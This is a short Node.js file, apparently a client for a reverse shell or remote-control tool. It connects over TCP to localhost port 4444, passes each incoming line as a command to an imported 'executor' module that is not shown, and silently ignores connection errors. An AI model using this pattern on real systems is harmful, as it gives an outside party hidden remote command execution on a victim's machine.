import net from 'net'
import { devNull } from 'os'
import executor from './modules/executor.mjs'

const client =  net.createConnection(4444,'127.0.0.1',() => {
  
  client.on('data', data => {
    try{
      const command = data.toString().trim().split(' ')
      executor(command, client)
    }catch(err) {
      client.write(err.toString())
    }
    
  })

}).on('error', (err) => devNull)



 